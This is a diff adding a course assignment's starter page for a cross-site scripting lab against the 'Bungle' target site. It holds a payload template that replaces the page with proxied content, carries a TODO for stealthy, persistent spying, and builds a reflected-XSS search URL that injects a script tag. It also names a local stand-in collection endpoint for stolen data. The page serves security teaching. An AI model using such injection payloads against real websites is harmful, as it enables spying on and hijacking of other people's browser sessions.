@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="27a3ed1">
+	<title>WebSec 2.2.3</title>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script>
+
+// Inject this payload. 
+// You MAY create your own injection from scratch, but we recommend this template as a starting point:
+function payload(attacker) {
+
+    // This function can make it appear that a new page has been loaded
+    // Note that you can proxy the main page, or a search page!
+	function proxy(href, spying_url) {
+
+        	// Make all current HTML invisible.
+        	$('html').hide();
+
+        	// overwrites current HTML. Execute a callback function when load has finished.
+        	$('html').load(href, function() {
+
+                // Show new HTML
+                $('html').show();
+
+                // TODO implement spying while being stealthy and persistent. Remove the alert.
+                alert("Notice that although we injected code into the search page, you see here the main page!")
+
+            });
+    	}
+    //Call Proxy
+	proxy('./', attacker)
+}
+
+function makeLink(target, attacker, defense) {
+
+    // Encode your payload function as a string 
+    payload_string = payload.toString();
+
+    switch(defense) {
+        case 1:
+            // TODO: Implement XSS warmup 2.2.3.1
+            return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=INSERT%20ATTACK%20HERE";
+        case 2:
+            // TODO: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<script>" +
+                    payload_string + 
+                    ";payload();" + 
+                    "</script" + ">"
+                );
+        case 3:
+            // TODO: generate XSS URL for defense level 2.2.3.3
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+        case 4:
+            // TODO: generate XSS URL payload for defense level 2.2.3.4
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+        case 5:
+            // TODO: generate XSS URL payload for defense level 2.2.3.5
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+        case 6:
+            // TODO: generate XSS URL payload for defense level 2.2.3.6
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+    }
+}
+
+// Generates malicous
+// You MUST not modify anything past this line.
+var target = `http://bungle-cs461.csl.illinois.edu/`;
+var attacker = `http://127.0.0.1:31337/stolen/`;
+
+$(function() {
+    $("#defense1").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 1) + "\">Try The Warmup! 2.2.3.1</a>");
+	$("#defense2").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 2) + "\">Try Bungle! 2.2.3.2 (No Defense)</a>");
+    $("#defense3").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 3) + "\">Try Bungle! 2.2.3.3 (Remove Script)</a>");
+    $("#defense4").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 4) + "\">Try Bungle! 2.2.3.4 (Recursively Remove Script)</a>");
+    $("#defense5").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 5) + "\">Try Bungle! 2.2.3.5 (Recursively Remove Tags)</a>");
+    $("#defense6").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 6) + "\">Try Bungle! 2.2.3.6 (Remove Quote Marks</a>");
+});
+</script>
+</head>
+
+<body>
+    <h3 id="defense1"></h3>
+    <h3 id="defense2"></h3>
+    <h3 id="defense3"></h3>
+    <h3 id="defense4"></h3>
+    <h3 id="defense5"></h3>
+    <h3 id="defense6"></h3>
+</body>
+</html>
